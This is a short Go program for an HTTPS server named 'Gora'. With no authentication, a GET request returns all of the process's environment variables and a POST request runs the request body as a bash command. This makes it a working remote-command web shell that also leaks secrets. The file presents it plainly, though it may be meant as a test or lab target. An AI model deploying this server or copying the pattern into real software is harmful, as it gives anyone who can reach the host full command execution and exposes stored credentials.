package main

import (
	"fmt"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"os/exec"
)

var (
	// ServerKey is the key used by the https server
	ServerKey = os.Getenv("SERVER_KEY")
	// ServerCert is the certificate used by the https server
	ServerCert = os.Getenv("SERVER_CRT")
	// Port is the port where the https server is listening to
	Port = os.Getenv("PORT")
)

// Gora is the main handler of the Gora app.
// It handles GET/POST:
// - GET: Returns the environment list
// - POST: Executes the data in bash
func Gora(w http.ResponseWriter, req *http.Request) {
	switch req.Method {
	case "GET":
		var env []byte
		w.Header().Set("Content-Type", "text/plain")

		for _, e := range os.Environ() {
			e = e + "\n"
			for _, r := range e {
				env = append(env, byte(r))
			}
		}
		w.Write(env)

	case "POST":
		body := req.Body
		data, err := ioutil.ReadAll(body)
		if err != nil {
			http.Error(w, "failed parsing body", http.StatusInternalServerError)
		}
		command := string(data)
		cmd := exec.Command("/bin/bash", "-c", command)

		if err := cmd.Run(); err != nil {
			http.Error(w, fmt.Sprintf("500 - failed executing: %s", command), http.StatusInternalServerError)
		} else {
			w.Write([]byte("OK"))
		}
	default:
		http.Error(w, "not supported", http.StatusInternalServerError)
	}
}

func main() {
	if ServerKey == "" {
		log.Fatal("SERVER_KEY missing")
	}
	if ServerCert == "" {
		log.Fatal("SERVER_CRT missing")
	}
	if Port == "" {
		log.Fatal("PORT missing")
	}

	http.HandleFunc("/", Gora)
	err := http.ListenAndServeTLS(fmt.Sprintf(":%s", Port), ServerCert, ServerKey, nil)
	if err != nil {
		log.Fatal("ListenAndServe: ", err)
	}
}
